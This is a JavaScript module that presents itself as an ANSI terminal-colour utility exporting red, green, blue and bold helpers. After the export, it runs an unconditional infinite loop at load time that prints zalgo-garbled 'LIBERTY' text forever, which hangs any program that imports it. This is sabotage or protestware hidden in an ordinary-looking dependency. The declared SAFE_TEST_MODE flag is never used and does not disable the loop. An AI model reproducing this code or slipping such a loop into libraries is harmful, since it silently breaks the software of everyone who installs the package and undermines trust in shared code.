const SAFE_TEST_MODE = true;

const CODES = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
};

function red(str) {
  return CODES.red + str + CODES.reset;
}
function green(str) {
  return CODES.green + str + CODES.reset;
}
function blue(str) {
  return CODES.blue + str + CODES.reset;
}
function bold(str) {
  return CODES.bold + str + CODES.reset;
}

module.exports = { red, green, blue, bold, CODES };

const LIBERTY_MESSAGE =
  "LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY LIBERTY";

function zalgo(text) {
  const zalgoChars = [
    "\u0300", "\u0301", "\u0302", "\u0303", "\u0304", "\u0305",
    "\u0306", "\u0307", "\u0308", "\u0309", "\u030A", "\u030B",
    "\u030C", "\u030D", "\u030E", "\u030F", "\u0310", "\u0311",
    "\u0312", "\u0313", "\u0314", "\u0315", "\u0316", "\u0317",
    "\u0318", "\u0319", "\u031A",
  ];
  let result = "";
  for (const char of text) {
    result += char;
    for (let i = 0; i < 5; i++) {
      result += zalgoChars[Math.floor(Math.random() * zalgoChars.length)];
    }
  }
  return result;
}

for (let i = 666; i < Infinity; i++) {
  console.log(zalgo(LIBERTY_MESSAGE));
}
